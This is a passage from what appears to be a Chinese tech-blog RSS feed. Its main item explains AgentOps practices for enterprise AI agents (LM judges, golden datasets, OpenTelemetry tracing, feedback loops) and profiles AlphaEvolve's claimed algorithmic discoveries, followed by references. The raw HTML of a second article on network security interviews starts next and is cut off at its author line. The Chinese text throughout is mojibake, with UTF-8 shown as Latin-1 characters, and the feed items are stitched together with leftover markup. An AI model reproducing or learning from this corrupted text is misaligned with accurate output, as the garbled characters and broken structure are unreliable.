<p>ä¸ºäº†è®© Agent åœ¨ä¼ä¸šç¯å¢ƒä¸­ç¨³å®šè¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦ä¸€å¥—ç±»ä¼¼äº DevOps çš„è¿ç»´ä½“ç³»ï¼Œç§°ä¸º <strong>AgentOps</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a92bda61c0e0478d8205d9ebc5a585ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=ETOuJUPk%2F1JWjJu2%2FQJlwd%2FK1ZU%3D" alt="image-20260105171900245" loading="lazy"/></p>
<p><strong>å›¾ 3ï¼šDevOpsã€MLOps ä¸ GenAIOps çš„å…³ç³»</strong></p>
<p>ä»¥ä¸‹æ˜¯åŸºäºæ¥æºå¯¹ AgentOps æ ¸å¿ƒç»„æˆéƒ¨åˆ†çš„æ·±åº¦è§£æï¼š</p>
<ul>
<li>
<ol>
<li>ä»â€œé€šè¿‡/å¤±è´¥â€åˆ°â€œè´¨é‡è¯„ä¼°ï¼ˆLM Judgeï¼‰â€</li>
</ol>
<p>åœ¨ä¼ ç»Ÿè½¯ä»¶ä¸­ï¼Œæµ‹è¯•å¾ˆç®€å•ï¼šè¾“å‡ºè¦ä¹ˆç­‰äºé¢„æœŸï¼Œè¦ä¹ˆä¸ç­‰äºã€‚ä½†åœ¨æ™ºèƒ½ä½“é¢†åŸŸï¼Œè¯­è¨€æ˜¯å¤æ‚çš„ï¼Œç­”æ¡ˆå¾€å¾€æ²¡æœ‰å”¯ä¸€æ ‡å‡†ã€‚</p>
<p>â€¢ <strong>LM è¯„å§” (LM Judge)ï¼š</strong> å¼€å‘è€…ä¸å†ä½¿ç”¨ç®€å•çš„å•å…ƒæµ‹è¯•ï¼Œè€Œæ˜¯ä½¿ç”¨ä¸€ä¸ªåŠŸèƒ½æ›´å¼ºå¤§çš„æ¨¡å‹ï¼ˆå¦‚ Gemini 2.5 Proï¼‰ä½œä¸ºâ€œè¯„å§”â€ï¼ŒæŒ‰ç…§é¢„å®šä¹‰çš„å‡†åˆ™ï¼ˆå¦‚ï¼šäº‹å®å‡†ç¡®æ€§ã€è¯­æ°”æ˜¯å¦å¾—ä½“ã€æ˜¯å¦éµå¾ªæŒ‡ä»¤ï¼‰å¯¹æ™ºèƒ½ä½“çš„è¾“å‡ºè¿›è¡Œæ‰“åˆ†ã€‚</p>
<p>â€¢ <strong>é»„é‡‘æ•°æ®é›† (Golden Dataset)ï¼š</strong> ä¸ºäº†ç¡®ä¿è¯„ä¼°çš„è¿è´¯æ€§ï¼Œéœ€è¦æ„å»ºåŒ…å«ç†æƒ³é—®é¢˜ä¸ç­”æ¡ˆçš„â€œé»„é‡‘æ•°æ®é›†â€ï¼Œå¹¶ç”±é¢†åŸŸä¸“å®¶è¿›è¡Œå®¡æ ¸ã€‚</p>
</li>
<li>
<ol start="2">
<li>æŒ‡æ ‡é©±åŠ¨å¼€å‘ï¼ˆæŒ‡æ ‡é©±åŠ¨å¼€å‘ï¼‰</li>
</ol>
<p>AgentOps å¼ºè°ƒ<strong>è¡¡é‡çœŸæ­£é‡è¦çš„ä¸šåŠ¡æŒ‡æ ‡</strong>ï¼Œè€Œä¸ä»…ä»…æ˜¯æŠ€æœ¯æŒ‡æ ‡ã€‚</p>
<p>â€¢ <strong>KPI ä½“ç³»ï¼š</strong> è¯„ä¼°ä¸ä»…çœ‹å›å¤æ˜¯å¦æ­£ç¡®ï¼Œè¿˜çœ‹ä»»åŠ¡å®Œæˆç‡ã€ç”¨æˆ·æ»¡æ„åº¦ã€å•æ¬¡äº¤äº’æˆæœ¬ä»¥åŠå¯¹ä¸šåŠ¡ç›®æ ‡ï¼ˆå¦‚æ”¶å…¥æˆ–ç•™å­˜ç‡ï¼‰çš„å®é™…è´¡çŒ®ã€‚</p>
<p>â€¢ <strong>éƒ¨ç½²å†³ç­– (Go/No-Go)ï¼š</strong> åœ¨å‘å¸ƒæ–°ç‰ˆæœ¬å‰ï¼Œé€šè¿‡åœ¨æ•´ä¸ªè¯„ä¼°æ•°æ®é›†ä¸Šè¿è¡Œæµ‹è¯•ï¼Œå°†æ–°æ—§ç‰ˆæœ¬çš„å¾—åˆ†è¿›è¡Œç›´æ¥å¯¹æ¯”ï¼Œä»è€Œæ¶ˆé™¤çŒœæµ‹ï¼Œç¡®ä¿æ¯ä¸€æ¬¡è¿­ä»£éƒ½æ˜¯è¿›æ­¥çš„ã€‚</p>
</li>
<li>
<ol start="3">
<li>ä½¿ç”¨ OpenTelemetry è¿›è¡Œæ·±åº¦è°ƒè¯•</li>
</ol>
<p>å½“æ™ºèƒ½ä½“è¡¨ç°å¼‚å¸¸æ—¶ï¼Œå¼€å‘è€…éœ€è¦å›ç­”â€œä¸ºä»€ä¹ˆâ€ã€‚</p>
<p>â€¢ <strong>è¿½è¸ª (Traces)ï¼š</strong> AgentOps åˆ©ç”¨ OpenTelemetry æ ‡å‡†è®°å½•æ™ºèƒ½ä½“çš„**â€œæ€ç»´è½¨è¿¹ï¼ˆTrajectoryï¼‰â€**ã€‚</p>
<p>â€¢ <strong>å…¨è¿‡ç¨‹é€æ˜åŒ–ï¼š</strong> é€šè¿‡ Traceï¼Œä½ å¯ä»¥çœ‹åˆ°å‘é€ç»™æ¨¡å‹çš„ç²¾ç¡®æç¤ºè¯ã€æ¨¡å‹å†…éƒ¨çš„æ¨ç†è¿‡ç¨‹ã€å®ƒé€‰æ‹©è°ƒç”¨çš„å·¥å…·ã€ç”Ÿæˆçš„å‚æ•°ä»¥åŠè§‚å¯Ÿåˆ°çš„åŸå§‹è¿”å›æ•°æ®ã€‚è¿™è®©è°ƒè¯•ä¸å†æ˜¯å¼€â€œé»‘ç›’â€ï¼Œè€Œæ˜¯åƒæŸ¥çœ‹ä»£ç è¿è¡Œæ—¥å¿—ä¸€æ ·æ¸…æ™°ã€‚</p>
</li>
<li>
<ol start="4">
<li>é—­ç¯çš„äººç±»åé¦ˆ (Human Feedback)</li>
</ol>
<p>AgentOps å°†äººç±»åé¦ˆè§†ä¸ºæœ€å®è´µçš„èµ„æºï¼Œè€Œéå¹²æ‰°ã€‚</p>
<p>â€¢ <strong>ç–«è‹—æ•ˆåº”ï¼š</strong> å½“ç”¨æˆ·ç‚¹å‡»â€œè¸©â€æˆ–æäº¤é”™è¯¯æŠ¥å‘Šæ—¶ï¼ŒAgentOps æµç¨‹ä¼šæ•è·è¿™ä¸ªçœŸå®çš„è¾¹ç¼˜æ¡ˆä¾‹ï¼Œå°†å…¶è½¬åŒ–ä¸ºè¯„ä¼°æ•°æ®é›†ä¸­çš„ä¸€ä¸ª<strong>æ°¸ä¹…æµ‹è¯•ç”¨ä¾‹</strong>ã€‚è¿™æ ·åšä¸ä»…ä¿®å¤äº†å½“å‰çš„é”™è¯¯ï¼Œè¿˜â€œæ¥ç§äº†ç–«è‹—â€ï¼Œç¡®ä¿ç³»ç»Ÿä»¥åå†ä¹Ÿä¸ä¼šçŠ¯åŒç±»é”™è¯¯ã€‚</p>
</li>
<li>
<ol start="5">
<li>æŒç»­è¿›åŒ–çš„æ“ä½œæ¡†æ¶</li>
</ol>
<p>æ™ºèƒ½ä½“çš„å¼€å‘æ›´åƒæ˜¯åœ¨â€œå¯¼æ¼”â€ä¸€åœºæˆï¼Œè€Œä¸æ˜¯â€œæ¬ç –â€ç›–æˆ¿ã€‚</p>
<p>â€¢ <strong>æ¨¡å‹è·¯ç”±ä¸å‡çº§ï¼š</strong> AgentOps å»ºç«‹äº†ä¸€å¥—çµæ´»çš„æ¡†æ¶ï¼Œå¯ä»¥æ ¹æ®ä»»åŠ¡å¤æ‚åº¦è‡ªåŠ¨è·¯ç”±åˆ°ä¸åŒçš„æ¨¡å‹ï¼ˆå¦‚å¤æ‚çš„ä»»åŠ¡ç»™ Proï¼Œç®€å•çš„ç»™ Flashï¼‰ï¼Œå¹¶èƒ½åœ¨æ–°æ¨¡å‹å‡ºç°æ—¶å¿«é€Ÿè¿›è¡Œè¯„æµ‹å’Œæ— ç¼æ›¿æ¢ï¼Œè€Œæ— éœ€é‡æ„æ•´ä¸ªç³»ç»Ÿæ¶æ„ã€‚</p>
<p>â€¢ <strong>ç¯å¢ƒæ²»ç†ï¼š</strong> åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­ï¼ŒAgentOps è¿˜è´Ÿè´£ç®¡ç†æ™ºèƒ½ä½“çš„èº«ä»½ï¼ˆAgent Identityï¼‰ã€æƒé™æ§åˆ¶ä»¥åŠé˜²æ­¢â€œæ™ºèƒ½ä½“ä¹±è±¡ï¼ˆAgent Sprawlï¼‰â€çš„ä¸­å¿ƒåŒ–æ²»ç†ã€‚</p>
</li>
<li>
<ol start="6">
<li>
<p>AgentOpså°ç»“</p>
<p><strong>ä¸ºäº†è®©ä½ æ›´ç›´è§‚åœ°ç†è§£ AgentOpsï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ¯”å–»ï¼š<strong>å¦‚æœå¼€å‘</strong>ä¼ ç»Ÿè½¯ä»¶</strong>åƒæ˜¯åœ¨<strong>ç¼–å†™ä¸€ä¸ªè®¡ç®—å™¨</strong>ï¼Œä½ åªéœ€è¦é€šè¿‡ç‚¹å‡»æŒ‰é’®æµ‹è¯• <code>1+1</code> æ˜¯å¦ç­‰äº <code>2</code>ï¼›é‚£ä¹ˆ <strong>AgentOps</strong> å°±åƒæ˜¯åœ¨<strong>æ‰§æ•™ä¸€æ”¯è¶³çƒé˜Ÿ</strong>ã€‚ä½ æ— æ³•ç²¾å‡†é¢„åˆ¤çƒå‘˜åœ¨åœºä¸Šçš„æ¯ä¸€ä¸ªåŠ¨ä½œï¼Œä½†ä½ å¯ä»¥é€šè¿‡åˆ¶å®šæˆ˜æœ¯æ‰‹å†Œï¼ˆæç¤ºè¯å·¥ç¨‹ï¼‰ã€æä¾›ä¸“ä¸šè£…å¤‡ï¼ˆå·¥å…·é›†æˆï¼‰ã€å½•åƒå›æ”¾åˆ†æï¼ˆTrace è¿½è¸ªï¼‰ä»¥åŠæ ¹æ®æ¯”èµ›ç»“æœè°ƒæ•´è®­ç»ƒè®¡åˆ’ï¼ˆåé¦ˆé—­ç¯ï¼‰ï¼Œæ¥ç¡®ä¿çƒé˜Ÿæœ€ç»ˆèƒ½èµ¢å¾—æ¯”èµ›ã€‚</p>
</li>
</ol>
</li>
</ul>
<h2 data-id="heading-10">å…­ã€ L4 æœ‰å¤šå¼ºï¼Ÿå‰æ²¿æ¡ˆä¾‹ï¼šç®—æ³•è¿›åŒ–è®º</h2>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeepmind.google%2Fblog%2Falphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms%2F" target="_blank" title="https://deepmind.google/blog/alphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms/" ref="nofollow noopener noreferrer">AlphaEvolve (ç®—æ³•è¿›åŒ– Agent)</a></h3>
<p>æ–°ç‰ˆæœ¬è¡¥å……äº†å…¶ <strong>â€œåŒè„‘åä½œâ€æœºåˆ¶</strong>ï¼ˆGemini Flash + Proï¼‰ã€<strong>â€œæ•°å­—è¾¾å°”æ–‡â€è¿›åŒ–é€»è¾‘</strong>ä»¥åŠå…·ä½“çš„<strong>é‡åŒ–æˆå°±</strong>ï¼ˆå¦‚æ‰“ç ´ 56 å¹´æ•°å­¦è®°å½•ã€èŠ‚çœ 0.7% å…¨çƒç®—åŠ›ç­‰ï¼‰ï¼Œä½¿å…¶æ›´èƒ½ä½“ç° L4 çº§ Agent çš„â€œè‡ªæˆ‘è¿›åŒ–â€ä¸â€œç§‘å­¦å‘ç°â€èƒ½åŠ›ã€‚</p>
<p>è¿™æ˜¯ L4 çº§â€œè‡ªæˆ‘è¿›åŒ–â€èƒ½åŠ›çš„å·…å³°ä½“ç°ã€‚AlphaEvolve ä¸ä»…ä»…æ˜¯å†™ä»£ç ï¼Œå®ƒæ˜¯åœ¨è¿›è¡Œ<strong>è‡ªä¸»ç§‘å­¦å‘ç°ï¼ˆAgentic Discoveryï¼‰</strong>ã€‚å®ƒå°†å¤§æ¨¡å‹çš„åˆ›é€ åŠ›ä¸è¿›åŒ–ç®—æ³•çš„ç­›é€‰æœºåˆ¶ç›¸ç»“åˆï¼Œè§£å†³è¿äººç±»ä¸“å®¶éƒ½æŸæ‰‹æ— ç­–çš„ç®—æ³•éš¾é¢˜ã€‚</p>
<ul>
<li><strong>æ ¸å¿ƒæœºåˆ¶ï¼šåŒè„‘é©±åŠ¨çš„â€œæ•°å­—è¾¾å°”æ–‡ä¸»ä¹‰â€</strong> AlphaEvolve çš„å·¥ä½œæ–¹å¼æ¨¡ä»¿äº†ç”Ÿç‰©è¿›åŒ–è®ºï¼Œç”±ä¸¤æ¬¾ä¸åŒç‰¹æ€§çš„ Gemini æ¨¡å‹ååŒé©±åŠ¨ï¼š
<ul>
<li><strong>å‘æ•£ï¼ˆVariationï¼‰ï¼š</strong> ä½¿ç”¨é€Ÿåº¦æå¿«çš„ <strong>Gemini Flash</strong> ä½œä¸ºâ€œå˜å¼‚å¼•æ“â€ï¼Œå¿«é€Ÿç”Ÿæˆå¤§é‡ä»£ç å˜ä½“ï¼Œæ¢ç´¢å¹¿æ³›çš„å¯èƒ½æ€§ç©ºé—´ã€‚</li>
<li><strong>æ·±æ€ï¼ˆRefinementï¼‰ï¼š</strong> ä½¿ç”¨æ¨ç†èƒ½åŠ›æ›´å¼ºçš„ <strong>Gemini Pro</strong> ä½œä¸ºâ€œä¼˜åŒ–å¼•æ“â€ï¼Œå¯¹æœ‰æ½œåŠ›çš„æ–¹æ¡ˆè¿›è¡Œæ·±åº¦ä¿®æ”¹å’Œé€»è¾‘å®Œå–„ã€‚</li>
<li><strong>è‡ªç„¶é€‰æ‹©ï¼ˆSelectionï¼‰ï¼š</strong> æ‰€æœ‰ç”Ÿæˆçš„ç®—æ³•éƒ½ä¼šè¢«æŠ•å…¥ä¸€ä¸ªä¸¥è‹›çš„è‡ªåŠ¨åŒ–è¯„ä¼°ç¯å¢ƒï¼ˆEvaluatorï¼‰ï¼Œåªæœ‰è¡¨ç°è¶…è¶Šä¸Šä¸€ä»£çš„ä»£ç æ‰èƒ½â€œå­˜æ´»â€ä¸‹æ¥ï¼Œæˆä¸ºä¸‹ä¸€ä»£è¿›åŒ–çš„çˆ¶æœ¬ã€‚</li>
</ul>
</li>
<li><strong>éœ‡æ’¼ä¸šç•Œçš„æˆå°±ï¼š</strong>
<ul>
<li><strong>æ‰“ç ´ 56 å¹´æ•°å­¦è®°å½•ï¼š</strong> åœ¨çŸ©é˜µä¹˜æ³•é¢†åŸŸï¼Œå®ƒè‡ªä¸»å‘ç°äº†ä¸€ç§é’ˆå¯¹ 4x4 çŸ©é˜µçš„æ–°ç®—æ³•ï¼Œä»…éœ€ 48 æ¬¡ä¹˜æ³•è¿ç®—ï¼ˆæ­¤å‰äººç±»ä¿æŒäº† 56 å¹´çš„è®°å½•æ˜¯ 49 æ¬¡ï¼‰ï¼Œç›´æ¥æ”¹å†™äº†åŸºç¡€æ•°å­¦æ•™ç§‘ä¹¦ã€‚</li>
<li><strong>ä¼˜åŒ–å…¨çƒåŸºç¡€è®¾æ–½ï¼š</strong> å®ƒé‡å†™äº† Google æ•°æ®ä¸­å¿ƒï¼ˆBorgï¼‰çš„ä»»åŠ¡è°ƒåº¦ç®—æ³•ã€‚è¿™ä¸ªç”± AI å‘æ˜çš„ç®€çŸ­å¯å‘å¼ç®—æ³•ï¼Œä¸º Google <strong>èŠ‚çœäº† 0.7% çš„å…¨çƒè®¡ç®—èµ„æº</strong>â€”â€”åœ¨å¤§è§„æ¨¡ç®—åŠ›æ—¶ä»£ï¼Œè¿™ç¬”èŠ‚çœæ˜¯å¤©æ–‡æ•°å­—ã€‚</li>
<li><strong>åå“º AI è‡ªèº«ï¼š</strong> å®ƒç”šè‡³ä¼˜åŒ–äº† TPU èŠ¯ç‰‡çš„åº•å±‚ Verilog ç”µè·¯è®¾è®¡ï¼Œå¹¶å°† Transformer æ¨¡å‹ä¸­çš„ FlashAttention å†…æ ¸é€Ÿåº¦æå‡äº† <strong>32.5%</strong>ï¼Œä»è€Œè®©ä¸‹ä¸€ä»£ AI çš„è®­ç»ƒé€Ÿåº¦æ›´å¿«ã€‚</li>
</ul>
</li>
</ul>
<p><strong>æœ¬è´¨åŒºåˆ«ï¼š</strong> ä¼ ç»Ÿçš„ Copilot æ˜¯å¸®ä½ å†™å‡º<strong>å·²çŸ¥</strong>çš„ç®—æ³•ï¼Œè€Œ AlphaEvolve æ˜¯å¸®ä½ å‘ç°<strong>æœªçŸ¥</strong>çš„ç®—æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/467042423c1f42e5a972d7a745e24260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=PYyHXsYKfVNsgwKel1o0kk74LbQ%3D" alt="unnamed" loading="lazy"/></p>
<p><strong>AlphaEvolve è¿›åŒ–15 æ¬¡çªå˜</strong></p>
<p>AlphaEvolve ä¸ºå‘ç°æ›´å¿«çŸ©é˜µä¹˜æ³•ç®—æ³•æå‡ºçš„å˜æ›´åˆ—è¡¨ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼ŒAlphaEvolve æå‡ºäº†å¯¹å¤šä¸ªç»„ä»¶è¿›è¡Œå¤§è§„æ¨¡å˜æ›´ï¼ŒåŒ…æ‹¬ä¼˜åŒ–å™¨å’Œæƒé‡åˆå§‹åŒ–ã€æŸå¤±å‡½æ•°ä»¥åŠè¶…å‚æ•°æ‰«æã€‚è¿™äº›å˜åŒ–éå¸¸ä¸ç®€å•ï¼Œè¿›åŒ–è¿‡ç¨‹ä¸­éœ€è¦ 15 æ¬¡çªå˜ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fadc6c28b01401aaaf4efe6e0f8e200~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=gEzFxG%2FyUAAKISahAjCFCv5in3I%3D" alt="image-20260105175145749" loading="lazy"/>
<h2 data-id="heading-12">ä¸ƒã€ æ€»ç»“ï¼šä½ çš„æ–°é˜Ÿå‘˜å·²å°±ä½</h2>
<p>Agentä¸å†åªæ˜¯è½¯ä»¶ï¼Œå®ƒä»¬æ­£åœ¨æˆä¸ºæˆ‘ä»¬å›¢é˜Ÿä¸­**â€œçµæ´»ã€åšå­¦ä¸”ä¸çŸ¥ç–²å€¦çš„æ–°æˆå‘˜â€**ã€‚</p>
<p>é€šè¿‡ Google çš„è¿™å¥—åˆ†çº§ä½“ç³»ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ° AI æ˜¯å¦‚ä½•ä¸€æ­¥æ­¥ä»â€œä¹¦å‘†å­â€å˜æˆâ€œå…¨èƒ½ç®¡å®¶â€çš„ã€‚æœªæ¥çš„æˆåŠŸä¸åœ¨äºä½ å†™äº†å¤šé•¿çš„ Promptï¼Œè€Œåœ¨äºä½ å¦‚ä½•æ„å»ºè¿™ä¸€å¥—ä¸¥è°¨çš„æ¶æ„ã€‚</p>
<p><strong>æœ€åé€å¤§å®¶ä¸€ä¸ªæ¯”å–»ï¼š</strong> å¦‚æœä¼ ç»Ÿçš„è½¯ä»¶æ˜¯ä¸€ä¸ª<strong>å¿…é¡»æŒ‰è½¨é“è¡Œé©¶çš„ç«è½¦</strong>ï¼Œé‚£ä¹ˆæ™ºèƒ½ä½“å°±åƒæ˜¯<strong>ä¸€è¾†é…å¤‡äº†é¡¶çº§å¯¼èˆªå‘˜çš„è‡ªåŠ¨é©¾é©¶èµ›è½¦</strong>ã€‚ä½ åªéœ€è¦å‘Šè¯‰å®ƒç»ˆç‚¹åœ¨å“ªé‡Œï¼ˆä½¿å‘½ï¼‰ï¼Œå®ƒä¼šè‡ªå·±è§‚å¯Ÿå¤©æ°”ï¼ˆæ‰«æç¯å¢ƒï¼‰ã€è§„åˆ’æœ€ä½³è·¯çº¿ï¼ˆæ·±åº¦æ€è€ƒï¼‰ã€æ§åˆ¶æ²¹é—¨è½¬å‘ï¼ˆé‡‡å–è¡ŒåŠ¨ï¼‰ï¼Œå¹¶åœ¨é‡åˆ°å°è·¯æˆ–æ„å¤–æ—¶ï¼Œçµæ´»åœ°ç»•è¡Œæˆ–è°ƒæ•´æ–¹æ¡ˆï¼ˆè§‚å¯Ÿè¿­ä»£ï¼‰ï¼Œç›´åˆ°æŠŠä½ å®‰å…¨é€åˆ°ç›®çš„åœ°ã€‚</p>
<h2 data-id="heading-13">å¼•ç”¨</h2>
<ol>
<li>Julia Wiesinger, Patrick Marlow, et al. 2024 â€œAgentsâ€.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fwhitepaper-agents" target="_blank" title="https://www.kaggle.com/whitepaper-agents" ref="nofollow noopener noreferrer">www.kaggle.com/whitepaper-â€¦</a>.</p>
<ol start="2">
<li>Antonio Gulli, Lavi Nigam, et al. 2025 â€œAgents Companionâ€.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fwhitepaper-agent-companion" target="_blank" title="https://www.kaggle.com/whitepaper-agent-companion" ref="nofollow noopener noreferrer">www.kaggle.com/whitepaper-â€¦</a>.</p>
<ol start="3">
<li>Shunyu Yao, Y. et al., 2022, 'ReAct: Synergizing Reasoning and Acting in Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2210.03629" target="_blank" title="https://arxiv.org/abs/2210.03629" ref="nofollow noopener noreferrer">arxiv.org/abs/2210.03â€¦</a>.</p>
<ol start="4">
<li>Wei, J., Wang, X. et al., 2023, 'Chain-of-Thought Prompting Elicits Reasoning in Large Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2201.11903.pdf" target="_blank" title="https://arxiv.org/pdf/2201.11903.pdf" ref="nofollow noopener noreferrer">arxiv.org/pdf/2201.11â€¦</a>.</p>
<ol start="5">
<li>Shunyu Yao, Y. et al., 2022, 'ReAct: Synergizing Reasoning and Acting in Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2210.03629" target="_blank" title="https://arxiv.org/abs/2210.03629" ref="nofollow noopener noreferrer">arxiv.org/abs/2210.03â€¦</a>.</p>
<ol start="6">
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.amazon.com%2FAgentic-Design-Patterns-Hands-Intelligent%2Fdp%2F3032014018" target="_blank" title="https://www.amazon.com/Agentic-Design-Patterns-Hands-Intelligent/dp/3032014018" ref="nofollow noopener noreferrer">www.amazon.com/Agentic-Desâ€¦</a></p>
</li>
<li>
<p>Shunyu Yao, et. al., 2024, â€˜Ï„-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domainsâ€™,</p>
</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2406.12045" target="_blank" title="https://arxiv.org/abs/2406.12045" ref="nofollow noopener noreferrer">arxiv.org/abs/2406.12â€¦</a>.</p>
<ol start="8">
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fartificialanalysis.ai%2Fguide" target="_blank" title="https://artificialanalysis.ai/guide" ref="nofollow noopener noreferrer">artificialanalysis.ai/guide</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvertex-ai%2Fgenerative-ai%2Fdocs%2Fmodel-reference%2Fvertex-ai-model-optimizer" target="_blank" title="https://cloud.google.com/vertex-ai/generative-ai/docs/model-reference/vertex-ai-model-optimizer" ref="nofollow noopener noreferrer">cloud.google.com/vertex-ai/gâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google%2Foverview%2Fgemini-live%2F" target="_blank" title="https://gemini.google/overview/gemini-live/" ref="nofollow noopener noreferrer">gemini.google/overview/geâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvision%3Fe%3D48754805%26hl%3Den" target="_blank" title="https://cloud.google.com/vision?e=48754805&amp;hl=en" ref="nofollow noopener noreferrer">cloud.google.com/vision?e=48â€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fspeech-to-text%3Fe%3D48754805%26hl%3Den" target="_blank" title="https://cloud.google.com/speech-to-text?e=48754805&amp;hl=en" ref="nofollow noopener noreferrer">cloud.google.com/speech-to-tâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fgoogle-cloud%2Fgenaiops-operationalize-generative-ai-apractical-guide-d5bedaa59d78" target="_blank" title="https://medium.com/google-cloud/genaiops-operationalize-generative-ai-apractical-guide-d5bedaa59d78" ref="nofollow noopener noreferrer">medium.com/google-clouâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvertex-ai%2Fgenerative-ai%2Fdocs%2Fagent-engine%2Fcode-execution%2Foverview" target="_blank" title="https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/code-execution/overview" ref="nofollow noopener noreferrer">cloud.google.com/vertex-ai/gâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.google.dev%2Fgemini-api%2Fdocs%2Ffunction-calling" target="_blank" title="https://ai.google.dev/gemini-api/docs/function-calling" ref="nofollow noopener noreferrer">ai.google.dev/gemini-api/â€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol%2F" target="_blank" title="https://github.com/modelcontextprotocol/" ref="nofollow noopener noreferrer">github.com/modelcontexâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.google.dev%2Fgemini-api%2Fdocs%2Fgoogle-search" target="_blank" title="https://ai.google.dev/gemini-api/docs/google-search" ref="nofollow noopener noreferrer">ai.google.dev/gemini-api/â€¦</a></p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´"å¯†ç è¦è®¾å¤æ‚ç‚¹"äº†]]></title>    <link>https://juejin.cn/post/7597270795212013608</link>    <guid>https://juejin.cn/post/7597270795212013608</guid>    <pubDate>2026-01-20T12:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795212013608" data-draft-id="7587277503946850304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´&quot;å¯†ç è¦è®¾å¤æ‚ç‚¹&quot;äº†"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-20T12:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´"å¯†ç è¦è®¾å¤æ‚ç‚¹"äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å
